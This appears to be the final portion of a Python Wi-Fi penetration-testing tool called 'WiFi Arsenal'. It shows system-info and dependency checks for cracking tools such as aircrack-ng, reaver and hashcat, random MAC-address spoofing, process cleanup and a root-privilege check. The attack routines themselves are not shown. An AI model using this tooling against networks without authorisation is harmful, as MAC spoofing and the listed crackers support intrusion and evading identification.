                        print(f"  - {f} ({size} bytes)")
                    if len(files) > 10:
                        print(f"  ... and {len(files) - 10} more files")
                        
    def system_info(self):
        """Enhanced system information"""
        print(f"\n{Fore.CYAN}[*] System Information:{Style.RESET_ALL}")
        print("-" * 50)
        
        # OS info
        try:
            with open('/etc/os-release', 'r') as f:
                for line in f:
                    if line.startswith('PRETTY_NAME'):
                        os_name = line.split('=')[1].strip().strip('"')
                        print(f"OS: {os_name}")
                        break
        except:
            print("OS: Unknown")
            
        # Kernel version
        try:
            kernel = subprocess.run(['uname', '-r'], capture_output=True, text=True)
            print(f"Kernel: {kernel.stdout.strip()}")
        except:
            pass
            
        # Python version
        print(f"Python: {sys.version.split()[0]}")
        
        # Network interfaces
        interfaces = self.get_interfaces()
        print(f"WiFi Interfaces: {', '.join(interfaces) if interfaces else 'None'}")
        
        # Current interface status
        if self.interface:
            print(f"Active Interface: {self.interface}")
        if self.monitor_interface:
            print(f"Monitor Interface: {self.monitor_interface}")
            
        # Memory usage
        try:
            import psutil
            memory = psutil.virtual_memory()
            print(f"Memory Usage: {memory.percent}% ({memory.used // (1024**3):.1f}GB / {memory.total // (1024**3):.1f}GB)")
        except:
            pass
            
        # Dependencies check
        print(f"\n{Fore.CYAN}[*] Dependencies Status:{Style.RESET_ALL}")
        critical_deps = ['iwconfig', 'iwlist']
        optional_deps = ['aircrack-ng', 'airodump-ng', 'aireplay-ng', 'airmon-ng', 
                        'wash', 'reaver', 'hashcat', 'john', 'hostapd', 'dnsmasq']
        
        print(f"{Fore.GREEN}Critical:{Style.RESET_ALL}")
        for dep in critical_deps:
            status = f"{Fore.GREEN}✓{Style.RESET_ALL}" if self.command_exists(dep) else f"{Fore.RED}✗{Style.RESET_ALL}"
            print(f"  {status} {dep}")
            
        print(f"{Fore.YELLOW}Optional:{Style.RESET_ALL}")
        for dep in optional_deps:
            status = f"{Fore.GREEN}✓{Style.RESET_ALL}" if self.command_exists(dep) else f"{Fore.RED}✗{Style.RESET_ALL}"
            print(f"  {status} {dep}")
            
    def mac_change(self, interface):
        """Enhanced MAC change with validation"""
        # Generate random MAC
        mac = ':'.join(['%02x' % random.randint(0, 255) for _ in range(6)])
        
        print(f"{Fore.YELLOW}[*] Changing MAC address of {interface} to {mac}{Style.RESET_ALL}")
        self.log_action("MAC Change", f"Interface: {interface}, New MAC: {mac}")
        
        try:
            subprocess.run(['ifconfig', interface, 'down'],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            if self.command_exists('macchanger'):
                subprocess.run(['macchanger', '-m', mac, interface],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            else:
                # Fallback method
                subprocess.run(['ip', 'link', 'set', 'dev', interface, 'address', mac],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
            subprocess.run(['ifconfig', interface, 'up'],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            print(f"{Fore.GREEN}[+] MAC address changed to {mac}{Style.RESET_ALL}")
            
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to change MAC address: {e}{Style.RESET_ALL}")
        
    def cleanup_and_exit(self):
        """Enhanced cleanup and exit"""
        print(f"\n{Fore.YELLOW}[*] Cleaning up...{Style.RESET_ALL}")
        
        # Stop monitor mode
        self.stop_monitor_mode()
        
        # Kill any running processes
        processes_to_kill = ['airodump-ng', 'aireplay-ng', 'reaver', 'wash']
        for process in processes_to_kill:
            try:
                subprocess.run(['pkill', '-f', process], 
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass
        
        # Restart network manager
        try:
            subprocess.run(['service', 'network-manager', 'restart'],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            try:
                subprocess.run(['systemctl', 'restart', 'NetworkManager'],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass
        
        # Save final log entry
        self.log_action("Session End", "WiFi Arsenal session terminated")
        
        print(f"{Fore.GREEN}[*] Cleanup completed")
        print(f"[*] Results saved in: {self.results_dir}")
        print(f"[*] Thank you for using WiFi Arsenal!")
        print(f"[*] Developed by {self.author}{Style.RESET_ALL}")
        sys.exit(0)
        
    def run(self):
        """Enhanced main entry point"""
        self.banner()
        
        # Check if running as root
        try:
            if os.geteuid() != 0:
                print(f"{Fore.RED}[!] This tool requires root privileges")
                print(f"[*] Please run with: sudo python3 wifi_arsenal.py{Style.RESET_ALL}")
                print(f"[*] Note: On Replit, some features may be limited due to container restrictions")
                response = input(f"{Fore.YELLOW}[?] Continue anyway? (y/N): {Style.RESET_ALL}").strip().lower()
                if response != 'y':
                    sys.exit(1)
                else:
                    print(f"{Fore.YELLOW}[*] Continuing with limited privileges...{Style.RESET_ALL}")
        except AttributeError:
            # os.geteuid() not available on some systems
            print(f"{Fore.YELLOW}[*] Cannot check root privileges, continuing...{Style.RESET_ALL}")
            
        # Check dependencies
        if not self.check_dependencies():
            print(f"{Fore.YELLOW}[*] Some dependencies are missing, but continuing...{Style.RESET_ALL}")
            
        print(f"{Fore.GREEN}[+] WiFi Arsenal initialized successfully")
        print(f"[*] Starting enhanced penetration testing suite...{Style.RESET_ALL}")
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, lambda sig, frame: self.cleanup_and_exit())
        signal.signal(signal.SIGTERM, lambda sig, frame: self.cleanup_and_exit())
        
        # Initialize log
        self.log_action("Session Start", f"WiFi Arsenal v{self.version} started")
        
        # Start main menu
        self.main_menu()

if __name__ == "__main__":
    try:
        arsenal = WiFiArsenal()
        arsenal.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}[!] Fatal error: {e}{Style.RESET_ALL}")
        sys.exit(1)
